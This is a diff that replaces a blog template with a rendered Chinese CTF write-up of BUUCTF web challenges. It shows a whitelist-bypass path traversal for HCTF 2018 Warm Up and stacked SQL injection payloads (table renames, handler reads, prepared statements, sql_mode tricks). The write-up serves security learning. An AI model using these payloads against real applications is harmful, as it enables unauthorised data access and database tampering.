@@ -1,37 +1,175 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    buu刷题记录1 |
+    
+    Hexo</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
 
+  
+<link rel="stylesheet" href="/css/technology.css">
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
 
-{% block page_class %}page-post-detail{% endblock %}
+  
+  
+<script src="/js/pace.min.js"></script>
 
+<meta name="generator" content="Hexo 5.1.1"></head>
 
-{% block content %}
+<body>
+  <div id="container">
+    <div id="wrap">
+      <section class="outer">
+  <article id="post-buu刷题记录1" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
 
-  <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      buu刷题记录1
+    </h1>
+  
 
-    <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
-    </div>
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/08/28/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/" class="article-date">
+  <time datetime="2020-08-28T02:49:46.000Z" itemprop="datePublished">2020-08-28</time>
+</a>
+        
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a> / <a class="article-category-link" href="/categories/web/web%E5%AE%89%E5%85%A8/">web安全</a>
   </div>
 
-{% endblock %}
+      </div>
+    
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+    <div class="article-entry" itemprop="articleBody">
+      
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+      
+
+      
+        <h2 id="2020-7-13-buu刷题记录1"><a href="#2020-7-13-buu刷题记录1" class="headerlink" title="2020-7-13-buu刷题记录1"></a>2020-7-13-buu刷题记录1</h2><p>(吐槽一波，由于这些题曾经做过这次是第二次做，浏览器智能得还留着我上一次操作的payload，导致我输入的时候payload直接就弹出来了/捂脸)</p>
+<h3 id="0x01-HCTF-2018-Warm-Up"><a href="#0x01-HCTF-2018-Warm-Up" class="headerlink" title="0x01 [HCTF 2018] Warm Up"></a>0x01 [HCTF 2018] Warm Up</h3><p>这个题考察CVE-2018-12613。拿到题目，f12发现给了source.php。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>审计代码发现有两个文件，其中hint.php提示了flag的位置，source.php就是源代码。其他文件的话都会返回<code>you can&#39;t see it</code>。但是仔细审计代码发现<code>$_page = mb_substr($page,0,mb_strpos($page . &#39;?&#39;, &#39;?&#39;));</code>这段代码存在逻辑漏洞，只需要在这两个满足白名单的文件后面加个<code>?</code>后就可以绕过了。</p>
+<p>故构造如下payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;source.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg.php</span><br></pre></td></tr></table></figure>
+
+<p>成功获得flag。</p>
+<h3 id="0x02-强网杯-2019-随便注"><a href="#0x02-强网杯-2019-随便注" class="headerlink" title="0x02 [强网杯 2019] 随便注"></a>0x02 [强网杯 2019] 随便注</h3><p>这个题考察堆叠注入。先测试<code>1&#39; or 1=1 #</code>发现可以正常返回，可以知道是单引号闭合，随后尝试union select注入发现被过滤且无法绕过。但是发现这里可以进行堆叠注入。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">show</span> <span class="keyword">databases</span>; <span class="comment">#   # 查看数据库</span></span><br><span class="line">1&#x27;;<span class="keyword">show</span> <span class="keyword">tables</span>; <span class="comment">#      # 查看数据表</span></span><br><span class="line">1&#x27;;<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`words`</span> <span class="comment">#     # 查看words表中的所有列名</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;;show columns from `1919810931114514` #    # 查看该表中的所有列名</span></span><br></pre></td></tr></table></figure>
+
+<p>随后发现在1919810931114514表中存在flag，但我们查询的是words表。故尝试修改表名来完成查询。修改words表为words1，1919810931114514表为words，然后修改列名，然后在输入万能密码查询就能得到flag了。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`words`</span> <span class="keyword">to</span> <span class="string">`words1`</span>;<span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`191910931114514`</span> <span class="keyword">to</span> <span class="string">`words`</span>;<span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`words`</span> <span class="keyword">change</span> <span class="string">`flag`</span> <span class="string">`id`</span> <span class="built_in">varchar</span>(<span class="number">100</span>); <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>不过这个题还有其他做法，可以通过mysql特有的handler语句完成查询。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;handler &#96;1919810931114514&#96; open;handler &#96;1919810931114514&#96; read first; #    #如果没读出来就handler &#96;1919810931114514 read next;一直往下读，读到flag为止。</span><br></pre></td></tr></table></figure>
+
+<p>或者通过预处理：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">sEt</span> a=<span class="keyword">CONCAT</span>(<span class="string">&#x27;se&#x27;</span>,<span class="string">&#x27;lect * from `1919810931114514`;&#x27;</span>);<span class="keyword">prePare</span> flag <span class="keyword">from</span> a;<span class="keyword">execute</span> flag; <span class="comment">#    # set和prepare被过滤了，不过这个可以通过大小写绕过</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-SUCTF-2019-EasySQL"><a href="#0x03-SUCTF-2019-EasySQL" class="headerlink" title="0x03 [SUCTF 2019] EasySQL"></a>0x03 [SUCTF 2019] EasySQL</h3><p>这个题也是堆叠注入，但是handler被过滤，且被限制了40位。前面的方法无法再使用了。测试一下发现，输入1，2，3等数字返回1，输入0或者非数字什么都不返回。猜测使用了||。然后发现通过修改sql_mode系统变量可以改变||的功能，把||的功能从运算符变成字符串拼接符。</p>
+<blockquote>
+<p>sql_mode可以设置的值有：ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,PIPES_AS_CONCAT,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION</p>
+</blockquote>
+<p>sql_mode主要关注两个值，PIPES_AS_CONCAT即将||当作字符串拼接符，STRICT_TRANS_TABLES即将||当作逻辑或运算符。</p>
+<p>ok接下来就简单了。将sql_mode设置成PIPES_AS_CONCAT，然后查询就完事。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">set</span> sql_mode=PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span>; <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>一个非预期。这个题没有过滤<em>，故可以直接\</em>,1，这样sql语句就变成了<code>select *,1||flag from Flag</code>，也就是<code>select *,1 from Flag</code>。直接查询flag表所有内容。</p>
+</blockquote>
+<h3 id="0x04-极客大挑战-2019-EasySQL"><a href="#0x04-极客大挑战-2019-EasySQL" class="headerlink" title="0x04 [极客大挑战 2019] EasySQL"></a>0x04 [极客大挑战 2019] EasySQL</h3><p>万能密码登录即可。</p>
+<h3 id="0x05-GYCTF-2020-Blacklist"><a href="#0x05-GYCTF-2020-Blacklist" class="headerlink" title="0x05 [GYCTF 2020] Blacklist"></a>0x05 [GYCTF 2020] Blacklist</h3><p>这个题set alter被过滤了且无法绕过，于是就只剩下使用handler进行查询的方法了。payload和强网杯那个一样，不再赘述。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://su29029.github.io/2020/08/28/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/" data-id="ckedortln000exity06ve0ldo"
+         class="article-share-link">分享</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></li></ul>
+
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/08/28/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            ctfshow萌新计划刷题记录
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/08/28/csrf-ssrf-session%E4%BC%AA%E9%80%A0/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">csrf&amp;ssrf&amp;session伪造</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  
+
+</article>
+
+
+
+</section>
+    </div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+<script src="/js/technology.js"></script>
+
+
+  </div>
+</body>
+</html>
